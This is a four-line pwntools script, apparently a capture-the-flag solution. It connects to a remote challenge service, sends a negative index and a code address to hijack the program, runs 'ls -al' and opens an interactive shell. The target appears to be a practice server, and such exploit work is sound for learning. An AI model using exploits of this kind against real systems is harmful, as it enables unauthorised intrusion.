from pwn import *
r = remote('csie.ctf.tw',10126)
r.send("-13\n4195991\nls -al\nls -al\n")
r.interactive()
